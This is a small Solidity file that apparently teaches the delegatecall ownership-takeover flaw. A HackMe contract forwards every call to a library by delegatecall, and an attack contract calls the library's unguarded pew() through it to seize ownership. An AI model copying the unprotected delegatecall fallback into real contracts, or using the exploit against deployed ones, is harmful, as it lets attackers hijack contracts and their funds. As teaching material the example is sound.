// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Lib{
    address public owner;
    constructor() {

        owner=msg.sender;
    }

    function pew() public {
        owner=msg.sender;
    }
}

contract HackMe {

    address public owner;
     Lib public lib;
     
     constructor(Lib _lib){
         owner=msg.sender;
         lib=Lib(_lib);
     }

     fallback() external payable {
         address(lib).delegatecall(msg.data);
     }

}

contract attack {
    HackMe public hackme;

    constructor(HackMe _hackme){
        hackme=HackMe(_hackme);
    }
    function updateowner() public {
        address(hackme).call(abi.encodeWithSignature("pew()"));
    }
}

